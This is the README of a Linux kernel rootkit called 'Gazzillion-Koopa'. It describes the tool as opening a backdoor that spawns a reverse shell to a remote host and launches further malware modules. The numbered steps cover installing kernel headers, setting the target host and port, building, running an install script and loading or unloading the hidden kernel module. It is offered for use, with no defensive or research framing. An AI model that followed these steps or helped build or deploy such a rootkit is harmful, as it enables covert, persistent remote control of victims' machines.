# Gazzillion-Koopa
cool rootkit that opens a backdoor that can spawn a reverse shell to a remote host

launch malware and more

instructions:
1. download your kernel header files
[apt install linux-headers-$(uname -r)]
2. dir examples in config.json
3. clone the project and cd  Gazzillion-Koopa
4. DISCLAIMER: ALWAYS DEFINE YOUR TARGET AND PORT IN CONFIG.H BEFORE BUILDING
5. build koopa by typing "make"
6. load koopa in the kernel and configure environment(thats where malware modules will be)
7. sudo ./install.sh
8. if you already ran the script and want to install koopa then sudo insmod ./koopa.ko
9. to unload sudo rmmod koopa but make sure it's not invisible
